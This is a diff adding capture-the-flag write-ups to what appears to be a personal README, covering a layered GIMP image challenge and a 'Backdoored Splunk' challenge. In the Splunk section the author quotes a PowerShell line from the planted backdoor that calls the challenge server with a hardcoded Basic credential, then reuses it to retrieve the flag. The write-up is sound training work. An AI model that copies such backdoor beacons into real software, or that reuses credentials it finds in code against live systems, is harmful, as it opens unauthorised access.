@@ -6,6 +6,7 @@ These are my write ups for the Huntress CTF 2023 challenges. I've already finish
 When the challenge is over, I'll update the results section with my standing
 
 ## Results
+10/6 @ 10:15AM (Mountain) - 89th Place
 
 ## Challenges
 
@@ -284,3 +285,61 @@ which i knew would print out the decoded block of text.
 This ended up being a perl script and it was very long. I started looking through and noted a password as well as some base64 encoded values. Those are always suspicious in a CTF so I decoded them and found some more scripts. Probably to run a webshell.
 
 But within one of those base64 strings, I saw another kind of encoding for a smaller string. Something called uuencode. I hadn't heard of this before, but I figured they were telling us what it was encoded with so I might as well try. I dropped it into dcode and found the flag.
+
+### Layered Security
+To start, I wanted to find out what the downloaded file for this challenge was, so I first ran `file` on it. This told me that it was likely a GIMP image. I figured I would need GIMP so I started it downloading.
+
+While it was downloading and installing, I went ahead and did a few othe quick checks. I ran `strings | grep flag` to see if there was just something easy hidden in it somewhere. No luck there. I then tried exiftool to get some more of its data, but I didn't see anything there.
+
+Finally I opened GIMP. I found there were a bunch of photos layered on top of each other. That makes sense for the name. I disabled layers one-by-one, starting at the top, and when I got about half way through, there was a picture that contained the flag.
+
+### Backdoored Splunk (17th Person to Solve)
+According to the prompt, the downloaded file for this challenge was a malicious version of splunk.
+
+They also gave us a link to a web address. When the address was visited it just displayed an error that said `{"error":"Missing or invalid Authorization header"}`. I was pretty sure it was just a matter of finding this authorization header.
+
+My first thought was to just start searching through all the folders in the download for a flag following the format for this CTF. So I searched for "flag{". No luck there. 
+
+But while I was in the code, I thought to look for the header. I knew that the program had to reach out to that website to give it the header, so I just searched the code for the web address: `chal.ctf.games`. I left off the port because I figured this would be specific enough.
+
+My search found the address in a powershell script:
+
+```
+$OS = @($html = (Invoke-WebRequest http://chal.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing).Content
+```
+
+Checking this base64-encoded string was the next logical step. It confirmed my thought process:
+
+`backdoor:use_this_to_authenticate_with_the_deployed_http_server`
+
+So now I just needed to send that header with my request. I had never done this before without using BurpSuite, but since that isn't allowed for this CTF, I started searching for other options. I tried a few chrome extensions that didn't seem to work, or I couldn't get them to work.
+
+Meanwhile the site got DDoS'd by all the traffic people were sending at it. So while the maintainers figured out the issue, I started thinking about other ways to send the request.
+
+In the end, what I did was just use the powershell script to invoke a request. I took the request from the code, hard-coded in the port number and dropped it into powershell:
+
+```
+Invoke-WebRequest http://chal.ctf.games:31106 -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing
+```
+
+This is the returned response (flag redacted):
+
+```
+StatusCode        : 200
+StatusDescription : OK
+Content           : <!-- <Base64-Encoded Flag was Here> -->
+RawContent        : HTTP/1.1 200 OK
+                    Content-Length: 69
+                    Content-Type: text/html; charset=utf-8
+
+                    <!-- <Base64-Encoded Flag was Here> -->
+Forms             :
+Headers           : {[Content-Length, 69], [Content-Type, text/html; charset=utf-8]}
+Images            : {}
+InputFields       : {}
+Links             : {}
+ParsedHtml        :
+RawContentLength  : 69
+```
+
+I went ahead and decoded the content from base64 and got the flag.
